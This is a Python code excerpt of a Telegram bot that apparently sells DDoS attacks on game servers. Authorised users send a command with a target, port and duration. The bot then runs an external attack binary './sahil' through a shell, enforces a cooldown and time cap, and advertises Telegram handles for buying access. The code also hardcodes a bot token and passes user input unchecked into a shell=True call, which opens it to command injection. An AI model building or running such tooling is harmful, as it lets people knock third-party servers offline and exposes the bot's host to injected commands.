...
bot = telebot.TeleBot('7277051157:AAEH63npqn3kvGj_hXKL0DykFk5th5kSaQI')
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            if user_id in bgmi_cooldown:
                ...
                if time_since_last_attack < 140:
                    remaining_time = 140 - time_since_last_attack
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 140:
                response = "Error: Time interval must be less than 140."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./sahil {target} {port} {time} 800"
                subprocess.run(full_command, shell=True)
                response = f"SAHIL 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY @blackhostbaba"
        else:
            response = "Usage :- /attack <target> <port> <time>\nBy @blackhostbaba"  # Updated command syntax
    else:
        response = "You Are Not User's To Authorized To Use This Command.\nBy OWNER BOT DM TO GET ACCESS @blackhostbypass"
